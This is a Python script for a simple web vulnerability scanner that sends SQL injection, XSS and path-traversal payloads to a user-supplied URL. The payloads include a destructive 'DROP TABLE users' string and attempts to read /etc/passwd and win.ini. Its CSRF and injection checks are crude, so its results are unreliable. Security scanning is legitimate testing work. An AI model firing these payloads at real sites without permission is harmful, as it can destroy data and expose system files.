import requests
import sys
import time

# ASCII Art Logo
logo = """
 ███╗   ██╗███████╗████████╗██╗    ██╗██╗███████╗███████╗
 ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██║██╔════╝██╔════╝
 ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║███████╗███████╗
 ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║╚════██║╚════██║
 ██║ ╚████║███████╗   ██║   ╚███╔███╔╝██║███████║███████║
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
--------------------------------------------------------
              ✦ Choose Your Option ✦
--------------------------------------------------------
    [1] SQL Injection Scanner
    [2] XSS Scanner
    [3] LFI Scanner
    [4] CSRF Scanner
--------------------------------------------------------
"""

# Menu Options
def menu():
    print(logo)
    choice = input("  [+] Select an option: ")
    
    if choice == "1":
        url = input("  [+] Enter target URL (with parameter): ")
        sql_injection_scan(url)
    elif choice == "2":
        url = input("  [+] Enter target URL: ")
        xss_scan(url)
    elif choice == "3":
        url = input("  [+] Enter target URL (with file parameter): ")
        lfi_scan(url)
    elif choice == "4":
        url = input("  [+] Enter target form URL: ")
        csrf_scan(url)
    else:
        print("\n  [-] Invalid option! Try again.\n")
        time.sleep(1)
        menu()

# SQL Injection Scanner
def sql_injection_scan(url):
    payloads = ["'", "' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --"]
    
    print("\n  [*] Testing for SQL Injection...\n")
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if "SQL syntax" in response.text or "mysql_fetch" in response.text:
            print(f"  [+] SQL Injection Vulnerability Found: {test_url}")
            return
    
    print("  [-] No SQL Injection vulnerability found.\n")

# XSS Scanner
def xss_scan(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

    print("\n  [*] Testing for XSS...\n")
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if payload in response.text:
            print(f"  [+] XSS Vulnerability Found: {test_url}")
            return
    
    print("  [-] No XSS vulnerability found.\n")

# LFI Scanner
def lfi_scan(url):
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]

    print("\n  [*] Testing for Local File Inclusion...\n")

    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if "root:x:" in response.text or "for 16-bit app support" in response.text:
            print(f"  [+] LFI Vulnerability Found: {test_url}")
            return
    
    print("  [-] No LFI vulnerability found.\n")

# CSRF Scanner (Basic Test)
def csrf_scan(url):
    print("\n  [*] Checking for CSRF Vulnerability...\n")

    response = requests.get(url)
    if "csrf" not in response.text.lower():
        print(f"  [+] CSRF Vulnerability Detected (No CSRF Token Found) at: {url}")
    else:
        print("  [-] CSRF Protection Found.\n")

# Run the Menu
menu()